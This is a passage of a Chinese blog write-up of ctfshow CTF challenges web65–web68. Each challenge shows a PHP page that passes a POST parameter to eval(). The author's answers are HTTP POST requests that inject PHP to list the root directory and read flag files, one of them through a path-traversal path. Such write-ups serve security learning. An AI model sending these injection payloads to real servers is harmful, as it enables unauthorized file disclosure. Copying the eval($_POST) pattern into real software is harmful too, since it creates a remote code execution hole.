+<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Lazzaro</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-07 22:02:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">'c'</span>])){</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">'c'</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">}<span class="keyword">else</span>{</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>还还还是一样 没招了</p>
+<p>同上题：</p>
+<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line">POST / HTTP/<span class="number">1.1</span></span><br><span class="line">Host: b0dadf6b-<span class="number">55</span>a7-<span class="number">45</span>a4-a761-<span class="number">28</span>f5f41f3e69.challenge.ctf.show</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: <span class="number">30</span></span><br><span class="line"></span><br><span class="line">c=<span class="title function_ invoke__">highlight_file</span>(<span class="string">"flag.php"</span>);</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+<hr>
+<h2 id="⭐️-38-web66"><a href="#⭐️-38-web66" class="headerlink" title="⭐️ 38 web66"></a>⭐️ 38 web66</h2><p>🚩flag：<code>ctfshow{2eb95fcc-f59f-411c-a64c-22495cec45a0}</code></p>
+<p>💡hint：<code>Web 命令执行（Command Injection）</code> <code>过滤绕过</code></p>
+<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Lazzaro</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-07 22:02:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">'c'</span>])){</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">'c'</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">}<span class="keyword">else</span>{</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>还还还是一样 没招了</p>
+<p>同上题：</p>
+<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line">POST / HTTP/<span class="number">1.1</span></span><br><span class="line">Host: cadaabf3-f83c-<span class="number">412</span>a-<span class="number">97</span>db-a9ec48dfddf6.challenge.ctf.show</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: <span class="number">30</span></span><br><span class="line"></span><br><span class="line">c=<span class="title function_ invoke__">highlight_file</span>(<span class="string">"flag.php"</span>);</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+<p>好吧 这次不一样了。<br>先查看根目录内容：</p>
+<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line">c=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">"/"</span>));</span><br></pre></td></tr></tbody></table></figure>
+
+<p>得到：Array ( [0] =&gt; . [1] =&gt; .. [2] =&gt; .dockerenv [3] =&gt; bin [4] =&gt; dev [5] =&gt; etc [6] =&gt; flag.txt [7] =&gt; home [8] =&gt; lib [9] =&gt; media [10] =&gt; mnt [11] =&gt; opt [12] =&gt; proc [13] =&gt; root [14] =&gt; run [15] =&gt; sbin [16] =&gt; srv [17] =&gt; sys [18] =&gt; tmp [19] =&gt; usr [20] =&gt; var )</p>
+<p>于是用查看根目录的：</p>
+<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line">c=<span class="title function_ invoke__">highlight_file</span>(<span class="string">"../../../flag.txt"</span>);</span><br></pre></td></tr></tbody></table></figure>
+
+<hr>
+<h2 id="⭐️-19-web67"><a href="#⭐️-19-web67" class="headerlink" title="⭐️ 19 web67"></a>⭐️ 19 web67</h2><p>🚩flag：<code>ctfshow{95b8ae7e-ca49-4290-bc3f-a6225c4e55c4}</code></p>
+<p>💡hint：<code>Web 命令执行（Command Injection）</code> <code>过滤绕过</code></p>
+<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Lazzaro</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-07 22:02:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">'c'</span>])){</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">'c'</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">}<span class="keyword">else</span>{</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>老规矩，先尝试：</p>
+<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line">POST / HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">121</span>da562-a5ae-<span class="number">403</span>b-<span class="number">9</span>a8a-<span class="number">423801</span>ca9c10.challenge.ctf.show</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: <span class="number">30</span></span><br><span class="line"></span><br><span class="line">c=<span class="title function_ invoke__">highlight_file</span>(<span class="string">"flag.php"</span>);</span><br></pre></td></tr></tbody></table></figure>
+
+<p>不在这里，然后尝试查看根目录内容<br>print_r被禁用了，尝试var_dump</p>
+<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line">POST / HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">121</span>da562-a5ae-<span class="number">403</span>b-<span class="number">9</span>a8a-<span class="number">423801</span>ca9c10.challenge.ctf.show</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: <span class="number">30</span></span><br><span class="line"></span><br><span class="line">c=<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">"/"</span>));</span><br></pre></td></tr></tbody></table></figure>
+<p>还是得到：<br>array(21) { [0]=&gt; string(1) “.” [1]=&gt; string(2) “..” [2]=&gt; string(10) “.dockerenv” [3]=&gt; string(3) “bin” [4]=&gt; string(3) “dev” [5]=&gt; string(3) “etc” [6]=&gt; string(8) “flag.txt” [7]=&gt; string(4) “home” [8]=&gt; string(3) “lib” [9]=&gt; string(5) “media” [10]=&gt; string(3) “mnt” [11]=&gt; string(3) “opt” [12]=&gt; string(4) “proc” [13]=&gt; string(4) “root” [14]=&gt; string(3) “run” [15]=&gt; string(4) “sbin” [16]=&gt; string(3) “srv” [17]=&gt; string(3) “sys” [18]=&gt; string(3) “tmp” [19]=&gt; string(3) “usr” [20]=&gt; string(3) “var” }</p>
+<p>还是在一样的位置，用同样的命令就好了<br>c=highlight_file(“../../../flag.txt”);</p>
+<hr>
+<h2 id="⭐️-20-web68"><a href="#⭐️-20-web68" class="headerlink" title="⭐️ 20 web68"></a>⭐️ 20 web68</h2><p>🚩flag：<code>ctfshow{29a2f685-fdb5-48a6-b03b-2e918a13fc47}</code></p>
+<p>💡hint：<code>命令执行</code> <code>POST</code></p>
+<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Lazzaro</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-07 22:02:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">'c'</span>])){</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">'c'</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">}<span class="keyword">else</span>{</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>c=var_dump(scandir(“/“)); c=readgzfile(“/flag.txt”);</p>
+<p>具体：</p>
+<pre><code class="php">POST / HTTP/1.1
+Host: b2f1653b-ecee-41b6-8831-cf5d9f751ce3.challenge.ctf.show
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 30
+
+c=highlight_file("flag.php");
+
+
+---
+
+今日份结束🔚
+
+![](https://a1.boltp.com/2026/02/09/6989c8d9b4594.jpeg)
+</code></pre>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://sereniusx.github.io">SereniusX</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://sereniusx.github.io/2026/02/09/CTF-ctfshow_Web%E5%85%A5%E9%97%A8_%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C4/">https://sereniusx.github.io/2026/02/09/CTF-ctfshow_Web%E5%85%A5%E9%97%A8_%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C4/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://sereniusx.github.io" target="_blank">SereniusX的博客</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/img/avatar2.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2026/02/08/CTF-ctfshow_Web%E5%85%A5%E9%97%A8_%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C3/" title="CTF-ctfshow_Web入门_命令执行3"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">CTF-ctfshow_Web入门_命令执行3</div></div><div class="info-2"><div class="info-item-1">题目来源：CTFshow 练习时间：2026年2月8日 练习数量：10 上篇博客链接：CTF-ctfshow_Web入门_命令执行2 ⭐️ 21 web49🚩flag：ctfshow{e73e678a-4628-4e0e-98a3-ca96a302ddc4} 💡hint：Web 命令执行（Command Injection） 过滤绕过 题目： &l...</div></div></div></a></nav><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="giscus-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar2.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">SereniusX</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">29</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">11</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/sereniusx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%AD%90%EF%B8%8F-31-web59"><span class="toc-text">⭐️ 31 web59</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%AD%90%EF%B8%8F-32-web60"><span class="toc-text">⭐️ 32 web60</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%AD%90%EF%B8%8F-33-web61"><span class="toc-text">⭐️ 33 web61</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%AD%90%EF%B8%8F-14-web62"><span class="toc-text">⭐️ 14 web62</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%AD%90%EF%B8%8F-35-web63"><span class="toc-text">⭐️ 35 web63</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%AD%90%EF%B8%8F-36-web64"><span class="toc-text">⭐️ 36 web64</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%AD%90%EF%B8%8F-37-web65"><span class="toc-text">⭐️ 37 web65</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%AD%90%EF%B8%8F-38-web66"><span class="toc-text">⭐️ 38 web66</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%AD%90%EF%B8%8F-19-web67"><span class="toc-text">⭐️ 19 web67</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%AD%90%EF%B8%8F-20-web68"><span class="toc-text">⭐️ 20 web68</span></a></li></ol></div></div><div class="card-widget card-post-series"><div class="item-headline"><i class="fa-solid fa-layer-group"></i><span>CTFshow练习记录</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/02/09/CTF-ctfshow_Web%E5%85%A5%E9%97%A8_%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C4/" title="CTF-ctfshow_Web入门_命令执行4">CTF-ctfshow_Web入门_命令执行4</a><time datetime="2026-02-09T10:46:46.000Z" title="发表于 2026-02-09 18:46:46">2026-02-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/02/08/CTF-ctfshow_Web%E5%85%A5%E9%97%A8_%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C3/" title="CTF-ctfshow_Web入门_命令执行3">CTF-ctfshow_Web入门_命令执行3</a><time datetime="2026-02-08T11:13:05.000Z" title="发表于 2026-02-08 19:13:05">2026-02-08</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/02/06/CTF-ctfshow_Web%E5%85%A5%E9%97%A8_%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C2/" title="CTF-ctfshow_Web入门_命令执行2">CTF-ctfshow_Web入门_命令执行2</a><time datetime="2026-02-06T08:17:29.000Z" title="发表于 2026-02-06 16:17:29">2026-02-06</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/02/04/CTF-ctfshow_Web%E5%85%A5%E9%97%A8_%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C1/" title="CTF-ctfshow_Web入门_命令执行1">CTF-ctfshow_Web入门_命令执行1</a><time datetime="2026-02-04T11:36:55.000Z" title="发表于 2026-02-04 19:36:55">2026-02-04</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;2025 - 2026 By SereniusX</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.4.0-b2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat-btn" type="button" title="聊天" style="display:none"><i class="fas fa-message"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>(() => {
+  const runMermaid = ele => {
+    window.loadMermaid = true
+    const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'
+
+    ele.forEach((item, index) => {
+      const mermaidSrc = item.firstElementChild
+      const mermaidThemeConfig = `%%{init:{ 'theme':'${theme}'}}%%\n`
+      const mermaidID = `mermaid-${index}`
+      const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent
+
+      const renderFn = mermaid.render(mermaidID, mermaidDefinition)
+      const renderMermaid = svg => {
+        mermaidSrc.insertAdjacentHTML('afterend', svg)
+      }
+
+      // mermaid v9 and v10 compatibility
+      typeof renderFn === 'string' ? renderMermaid(renderFn) : renderFn.then(({ svg }) => renderMermaid(svg))
+    })
+  }
+
+  const codeToMermaid = () => {
+    const codeMermaidEle = document.querySelectorAll('pre > code.mermaid')
+    if (codeMermaidEle.length === 0) return
+
+    codeMermaidEle.forEach(ele => {
+      const preEle = document.createElement('pre')
+      preEle.className = 'mermaid-src'
+      preEle.hidden = true
+      preEle.textContent = ele.textContent
+      const newEle = document.createElement('div')
+      newEle.className = 'mermaid-wrap'
+      newEle.appendChild(preEle)
+      ele.parentNode.replaceWith(newEle)
+    })
+  }
+
+  const loadMermaid = () => {
+    if (false) codeToMermaid()
+    const $mermaid = document.querySelectorAll('#article-container .mermaid-wrap')
+    if ($mermaid.length === 0) return
+
+    const runMermaidFn = () => runMermaid($mermaid)
+    btf.addGlobalFn('themeChange', runMermaidFn, 'mermaid')
+    window.loadMermaid ? runMermaidFn() : btf.getScript('https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js').then(runMermaidFn)
+  }
+
+  btf.addGlobalFn('encrypt', loadMermaid, 'mermaid')
+  window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
+})()</script><script>(() => {
+  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'
+  const option = {"mapping":"pathname","strict":0,"reactions_enabled":1,"emit_metadata":0,"input_position":"top","lang":"zh-CN"}
+
+  const getGiscusTheme = theme => theme === 'dark' ? 'dark' : 'light'
+
+  const createScriptElement = config => {
+    const ele = document.createElement('script')
+    Object.entries(config).forEach(([key, value]) => {
+      ele.setAttribute(key, value)
+    })
+    return ele
+  }
+
+  const loadGiscus = (el = document, key) => {
+    const mappingConfig = isShuoshuo
+      ? { 'data-mapping': 'specific', 'data-term': key }
+      : { 'data-mapping': (option && option['data-mapping']) || 'pathname' }
+
+    const giscusConfig = {
+      src: 'https://giscus.app/client.js',
+      'data-repo': 'sereniusx/sereniusx.github.io',
+      'data-repo-id': 'R_kgDOQCvQvQ',
+      'data-category-id': 'DIC_kwDOQCvQvc4C1pNr',
+      'data-theme': getGiscusTheme(document.documentElement.getAttribute('data-theme')),
+      'data-reactions-enabled': '1',
+      crossorigin: 'anonymous',
+      async: true,
+      ...option,
+      ...mappingConfig
+    }
+
+    const scriptElement = createScriptElement(giscusConfig)
+
+    el.querySelector('#giscus-wrap').appendChild(scriptElement)
+
+    if (isShuoshuo) {
+      window.shuoshuoComment.destroyGiscus = () => {
+        if (el.children.length) {
+          el.innerHTML = ''
+          el.classList.add('no-comment')
+        }
+      }
+    }
+  }
+
+  const changeGiscusTheme = theme => {
+    const iframe = document.querySelector('#giscus-wrap iframe')
+    if (iframe) {
+      const message = {
+        giscus: {
+          setConfig: {
+            theme: getGiscusTheme(theme)
+          }
+        }
+      }
+      iframe.contentWindow.postMessage(message, 'https://giscus.app')
+    }
+  }
+
+  btf.addGlobalFn('themeChange', changeGiscusTheme, 'giscus')
+
+  if (isShuoshuo) {
+    'Giscus' === 'Giscus'
+      ? window.shuoshuoComment = { loadComment: loadGiscus }
+      : window.loadOtherComment = loadGiscus
+    return
+  }
+
+  if ('Giscus' === 'Giscus' || !false) {
+    if (false) btf.loadComment(document.getElementById('giscus-wrap'), loadGiscus)
+    else loadGiscus()
+  } else {
+    window.loadOtherComment = loadGiscus
+  }
+})()</script></div><script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/gh/xiabo2/CDN@latest/fishes.js"></script><script src="/js/post-meta.js"></script><script src="/js/bg-duotone.js"></script><script src="/js/post-meta.js"></script><script src="/js/heatmap.js"></script><script src="/js/hr-random.js"></script><script>(() => {
+  window.ChatraID = 'xYpW5Meo932eB55bm'
+  window.Chatra = window.Chatra || function() {
+    (window.Chatra.q = window.Chatra.q || []).push(arguments)
+  }
+
+  btf.getScript('https://call.chatra.io/chatra.js').then(() => {
+    const isChatBtn = true
+    const isChatHideShow = true
+
+    if (isChatBtn) {
+      const close = () => {
+        Chatra('minimizeWidget')
+        Chatra('hide')
+      }
+
+      const open = () => {
+        Chatra('openChat', true)
+        Chatra('show')
+      }
+
+      window.ChatraSetup = { startHidden: true }
+    
+      window.chatBtnFn = () => document.getElementById('chatra').classList.contains('chatra--expanded') ? close() : open()
+
+      document.getElementById('chat-btn').style.display = 'block'
+    } else if (isChatHideShow) {
+      window.chatBtn = {
+        hide: () => Chatra('hide'),
+        show: () => Chatra('show')
+      }
+    }
+  })
+})()</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
